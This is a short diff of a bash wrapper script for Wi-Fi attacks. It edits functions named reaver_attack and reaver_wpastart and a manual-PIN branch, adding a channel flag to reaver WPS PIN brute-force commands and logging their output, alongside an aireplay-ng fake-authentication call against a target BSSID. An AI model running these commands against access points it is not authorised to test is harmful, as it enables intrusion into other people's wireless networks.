@@ -148,7 +148,7 @@ function reaver_attack
 {
 	clear
 	xterm -geometry 90x70+0+0 -e "sleep 5 && aireplay-ng $WLANNM -1 120 -a $BSSIDT" & disown
-	reaver -i $WLANNM -b $BSSIDT -v -N -A | tee /root/lscript/wpslog
+	reaver -i $WLANNM -b $BSSIDT -c $CHANT -v -N -A | tee /root/lscript/wpslog
 	echo -e "Press "$YS"enter"$CE" to go back"
 	read	
 }
@@ -162,7 +162,7 @@ function pixie_attack
 }
 function reaver_wpastart
 {
-	reaver -i $WLANNM -b $BSSIDT -p $WPST -vv
+	reaver -i $WLANNM -b $BSSIDT -c $CHANT -p $WPST -vv
 	echo -e "$PAKTC"
 	read
 }
@@ -461,7 +461,7 @@ then
 		echo -e "Enter your target's WPS pin: "
 		read -e WPST
 		clear
-		reaver -i $WLANNM -b $BSSIDT -p $WPST -vv
+		reaver -i $WLANNM -b $BSSIDT -c $CHANT -p $WPST -vv | tee /root/lscript/wpslog
 		echo -e "Press "$YS"enter"$CE" to go back"
 		read
 	else
